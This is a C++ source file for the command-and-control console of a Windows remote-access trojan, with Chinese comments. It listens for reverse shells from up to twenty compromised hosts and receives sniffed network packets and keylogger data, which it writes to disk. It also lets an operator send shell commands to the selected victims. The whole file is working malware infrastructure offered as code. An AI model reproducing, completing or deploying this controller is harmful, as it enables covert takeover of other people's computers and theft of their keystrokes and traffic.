//////////////////////////////////////////////////////////////
//author : superfish
//date : 2015/12/13
//name : control.cpp
//////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define MAXCLIENT                      20 //最多控制客户端数
#define MAXLINE                        256 //命令最大长度
#define BUFFER_SIZE                    1024 * 10 //缓冲区大小
#define IP                             "10.206.6.6" //控制端IP
#define SHELLPORT                      "8080" //shell接收端口
#define PACKPORT                       "8081" //嗅探包接收端口
#define KEYLOGPORT                     "8082" //键盘记录接收端口
#define PACKDIR                        "c:\\pack\\" //嗅探数据包存放目录
#define KEYLOGDIR                      "c:\\keylog\\" //键盘记录数据存放目录
#define DEBUG 
#ifdef DEBUG
    #define DEBUG_LOG                  "c:\\debug.txt"
#endif

typedef struct st_accept //定义被控端信息结构
{
	SOCKET csock;
	SOCKADDR_IN csin;
	BOOL isOpen;
}ACCEPT;

//函数声明
int GetShell(void);
int SnifferHandleMain(void);
void SnifferHandle(ACCEPT carg);
int SockLitsen(SOCKET *sock, SOCKADDR_IN *sin, char ip[], char port[], char infunc[]);
int CMD(void);
void PrintCommand(void);
void PrintClient(void);
void SetisControl(void);
void EnterShell(void);
void Gone(void);
BOOL StartWith(char *buf1, char *buf2);
#ifdef DEBUG
void LogToFile(char *str);
#endif

//全局变量
WSADATA                                wsaData; //初始化套接字
ACCEPT                                 client[MAXCLIENT]; //存储被控端信息
BOOL                                   isControl[MAXCLIENT]; //指示命令是否发往被控端
int                                    count; //已连接的被控端数量
BOOL                                   gone; //是否主动断开连接                            
#ifdef DEBUG
char tmp[256];
#endif


//主函数
int main(int argc, char *argv[])
{
	HANDLE threadHandle;
	DWORD threadID = 0;
	gone = FALSE;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		#ifdef DEBUG
	        memset(tmp, 0, sizeof(tmp));
		    sprintf(tmp, "main: WSAStartup error: %d\n", GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("main: WSAStartup error: %d\n", GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
		LogToFile("main: WSAStartup successful\n");
    #endif

	//创建线程处理嗅探
	threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SnifferHandleMain, NULL, 0, &threadID);
	if(threadHandle == NULL){
		#ifdef DEBUG
            memset(tmp, 0, sizeof(tmp));
            sprintf(tmp,"main: Create thread to handle sniffer error: %d\n", GetLastError());
            LogToFile( tmp );
        #endif
			
		printf("main: Create thread to handle sniffer error: %d\n", GetLastError());
		return -1;
	}
		
	#ifdef DEBUG
        LogToFile("main: Create thread to handle sniffer successful\n");
    #endif
	
	threadID++;
	CloseHandle(threadHandle);
	
	//创建线程接收shell
	threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetShell, NULL, 0, &threadID);
	if(threadHandle == NULL){
		#ifdef DEBUG
            memset(tmp, 0, sizeof(tmp));
            sprintf(tmp,"main: Create thread to get shell error: %d\n", GetLastError());
            LogToFile( tmp );
        #endif
			
		printf("main: Create thread to get shell error: %d\n", GetLastError());
		return -1;
	}
		
	#ifdef DEBUG
        LogToFile("main: Create thread to get shell successful\n");
    #endif
	
	threadID++;
	CloseHandle(threadHandle);
	
	//启动控制台
	CMD();
	
	return 0;
}

//GETSHELL线程
int GetShell(void)
{
	SOCKET sock;
	SOCKADDR_IN sin;
	int len;
	
	if(SockLitsen(&sock, &sin, IP, SHELLPORT, "GetShell") != 0) return -1;
	
	//接收shell	
	memset(client, 0, sizeof(client));
	count = 0;
	for(int i = 0;i < MAXCLIENT;i++){
		len = sizeof(client[i].csin);
		client[i].csock = accept(sock, (struct sockaddr *)&(client[i].csin), &len);
		client[i].isOpen = TRUE;

		#ifdef DEBUG
		    LogToFile("GetShell: Accept a socket...\n");
		#endif
		
		count++;
	}
	
	while(!gone){
		;
	}
	
	closesocket(sock);
	
	return 0;
}

//嗅探处理主线程
int SnifferHandleMain(void)
{
	SOCKET sock;
	SOCKADDR_IN sin;
	int len;
	ACCEPT carg;
	HANDLE threadHandle;
	DWORD threadID = 0;
	
	if(SockLitsen(&sock, &sin, IP, PACKPORT, "SnifferHandleMain") != 0) return -1;
	
	while(!gone){
		len = sizeof(carg.csin);
		carg.csock = accept(sock, (struct sockaddr *)&(carg.csin), &len);
	
		#ifdef DEBUG
		    LogToFile("SnifferHandleMain: Accept a socket...\n");
		#endif
		
		threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SnifferHandle, &carg, 0, &threadID);
		if(threadHandle == NULL){
			#ifdef DEBUG
                memset(tmp, 0, sizeof(tmp));
                sprintf(tmp,"SnifferHandleMain: Create thread to handle accept error: %d\n", GetLastError());
                LogToFile(tmp);
            #endif
			
			printf("SnifferHandleMain: Create thread to handle accept error: %d\n", GetLastError());
			return -1;
		}
		
		#ifdef DEBUG
            LogToFile("SnifferHandleMain: Create thread to handle accept successful\n");
        #endif
		
		CloseHandle(threadHandle);
		threadID++;
	}
	
	closesocket(sock);
	
	return 0;
}

//嗅探包处理
void SnifferHandle(ACCEPT carg)
{
	char cIP[16] = {0};
	char cPORT[5] = {0};
	char buffer[BUFFER_SIZE];
	int len;
	char filePath[MAX_PATH] = {0};
	FILE *fp;
	
	//得到客户端IP和PORT
	strcpy(cIP, inet_ntoa(carg.csin.sin_addr));
	itoa((int)ntohs((carg.csin.sin_port)), cPORT, 10);
	
	//得到文件路径: PACKDIR\cIP:cPORT.txt
	strcpy(filePath, PACKDIR);
	strcat(filePath, cIP);
	strcat(filePath, ":");
	strcat(filePath, cPORT);
	strcat(filePath, ".txt");
	
	memset(buffer, 0, sizeof(buffer));
	fp = fopen(filePath, "a");
	while(!gone){
		len = recv(carg.csock, buffer, sizeof(buffer), 0);
		if(len < 0){
            sprintf(buffer,"SnifferHandle: recv error: %d\n", GetLastError());
            fputs(buffer, fp);
			
			Sleep(10000);
		}else{
			fputs(buffer, fp);
		}
	}
	
	fclose(fp);
	return;
}

//让套接字监听端口(含调试信息)
int SockLitsen(SOCKET *sock, SOCKADDR_IN *sin, char ip[], char port[], char infunc[])
{
	*sock = socket(AF_INET, SOCK_STREAM, 0);
	if(*sock == INVALID_SOCKET){
		#ifdef DEBUG
	        memset(tmp, 0, sizeof(tmp));
		    sprintf(tmp, "%s: Create socket error: %d\n", infunc, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("%s: Create socket error: %d\n", infunc, GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
	    memset(tmp, 0, sizeof(tmp));
        sprintf(tmp, "%s: Create socket successful\n", infunc);
		LogToFile(tmp);
    #endif
	
	memset(sin, 0, sizeof(*sin));
	(*sin).sin_family = AF_INET;
	(*sin).sin_port = htons(atoi(port)); 
	(*sin).sin_addr.s_addr = inet_addr(ip);
	
	if(bind(*sock, (struct sockaddr *)sin, sizeof(*sin)) != 0){
		#ifdef DEBUG
	        memset(tmp, 0, sizeof(tmp));
		    sprintf(tmp, "%s: Bind socket error: %d\n", infunc, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("%s: Bind socket error: %d\n", infunc, GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
	    memset(tmp, 0, sizeof(tmp));
	    sprintf(tmp, "%s: Bind socket successful\n", infunc);
        LogToFile(tmp);
    #endif
	
	if(listen(*sock, MAXCLIENT) != 0){
		#ifdef DEBUG
	        memset(tmp, 0, sizeof(tmp));
		    sprintf(tmp, "%s: Listen socket error: %d\n", infunc, GetLastError());
		    LogToFile(tmp);
	    #endif
		
		printf("%s: Listen socket error: %d\n", infunc, GetLastError());
		return -1;
	}
	
	#ifdef DEBUG
	    memset(tmp, 0, sizeof(tmp));
        sprintf(tmp, "%s: Listen socket successful\n", infunc);
		LogToFile(tmp);
    #endif
	
	return 0;
}

//控制台函数
int CMD(void)
{
	char cmd = '1'; //控制字符
	
	printf("\nWelcome!\n");
	printf("If you are in shell, input command line start with '~' can return to this page.\n");
	printf("\n");
	PrintCommand();
	
	while(TRUE){
		printf("CMD> ");
		scanf("%c", &cmd);
		fflush(stdin);
		
		if(cmd == '0'){
			Gone();
			break;
		}
		if(cmd == '1'){
			PrintCommand();
			cmd = '1';
			continue;
		}
		if(cmd == '2'){
			PrintClient();
			cmd = '1';
			continue;
		}
		if(cmd == '3'){
			SetisControl();
			cmd = '1';
			continue;
		}
		if(cmd == '4'){
			EnterShell();
			PrintCommand();
			cmd = '1';
			continue;
		}
		printf("Invalid cmd\n");
		cmd = '1';
	}
	
	return 0;
}

//打印操作列表
void PrintCommand(void)
{
	printf("Command List: \n");
	printf("1 ------- Print command list\n");
	printf("2 ------- Print client list\n");
	printf("3 ------- Set isControl\n");
	printf("4 ------- Enter shell\n");
	printf("0 ------- Gone\n");
	
	return;
}

//打印被控端列表
void PrintClient(void)
{
	printf("Count: %d\n", count);
	printf("Client List: \n");
	for(int i = 0;i < count;i++){
		printf("NUM: %d  cIP: %s  cPORT: %d  ", i, inet_ntoa(client[i].csin.sin_addr), (int)ntohs(client[i].csin.sin_port));
		if(client[i].isOpen){
			printf("isOpen: TRUE\n");
		}else{
			printf("isOpen: FALSE\n");
		}
		if(isControl[i]){
			printf("isControl: TRUE\n");
		}else{
			printf("isControl: FALSE\n");
		}
	}
	
	return;
}

//设置isControl
void SetisControl(void)
{
	char set = 'q';
	int num = -1;
	
	while(TRUE){
		printf("'t' to set TRUE, 'f' to set FALSE, 'q' to return: ");
		scanf("%c", &set);
		fflush(stdin);
		
		if(set == 'q') break;
		if(set == 't' || set == 'T'){
			while(TRUE){
				printf("Input a num of client to set TRUE, -1 to go back: ");
				scanf("%d", &num);
				fflush(stdin);
				
				if(num == -1) break;
				if(num >= 0 && num < count){
					isControl[num] = TRUE;
					num = -1;
					continue;
				}
				printf("Invalid num\n");
				num = -1;
			}
			set = 'q';
			continue;
		}
		if(set == 'f' || set == 'F'){
			while(TRUE){
				printf("Input a num of client to set FALSE, -1 to go back: ");
				scanf("%d", &num);
				fflush(stdin);
				
				if(num == -1) break;
				if(num >= 0 && num < count){
					isControl[num] = FALSE;
					num = -1;
					continue;
				}
				printf("Invalid num\n");
				num = -1;
			}
			set = 'q';
			continue;
		}
		printf("Invalid set\n");
		set = 'q';
	}
	printf("Set isControl OK\n");
	
	return;
}

//进入shell
void EnterShell(void)
{
	char shell[MAXLINE] = {0}; //要执行的命令
	char buffer[BUFFER_SIZE]; //接收的输出
	int i, rs, buflen;
	
	memset(buffer, 0, BUFFER_SIZE);
	
	printf("Enter shell\n");
	while(TRUE){
		printf("#> ");
		
		gets(shell); //这里可能溢出。。
		if(StartWith(shell, "~")) break; //退出shell
		if(shell == NULL) continue; //空命令
		
		//在被控端执行命令
		strcat(shell, "\n"); //加上回车
		for(i = 0;i < count;i++){
			if(!isControl[i]) continue;
			send(client[i].csock, shell, strlen(shell), 0);
			
			//接收并显示被控端输出
			rs = 1;
			buflen = 0;
			printf("cIP: %s  cPORT: %d  shell result: \n", inet_ntoa(client[i].csin.sin_addr), (int)ntohs(client[i].csin.sin_port));
			while(rs){
				buflen = recv(client[i].csock, buffer, BUFFER_SIZE, 0);
				if(buflen < 0){
					printf("bad sock\n");
					break;
				}else if(buflen == 0){
					client[i].isOpen = FALSE;
					printf("csock is been closed\n");
					break;
				}else{
						
					if(buflen != BUFFER_SIZE){ //已接收完
						printf("%s", buffer);
						printf("\n");
						
						memset(buffer, 0, BUFFER_SIZE);
						rs = 0;
					}else{ //没收完
						printf("%s", buffer);
						
						memset(buffer, 0, BUFFER_SIZE);
						rs = 1;
					}
				}
			}
		}
	}
	printf("Exit shell\n");
	
	return;
}

//gone
void Gone(void)
{
	gone = TRUE;
	printf("Gone\n");
	
	return;
}

//判断buf1是否以buf2开头
BOOL StartWith(char *buf1, char *buf2)
{
	int len = strlen(buf2);
	if(!memcmp(buf1, buf2, len)){
		return TRUE;
	}else{
		return FALSE;
	}
}

//日志记录函数
#ifdef DEBUG
void LogToFile(char *str)
{
    FILE *fp;
      
    fp = fopen(DEBUG_LOG, "a");
    fputs(str, fp);
    fclose(fp);
}
#endif
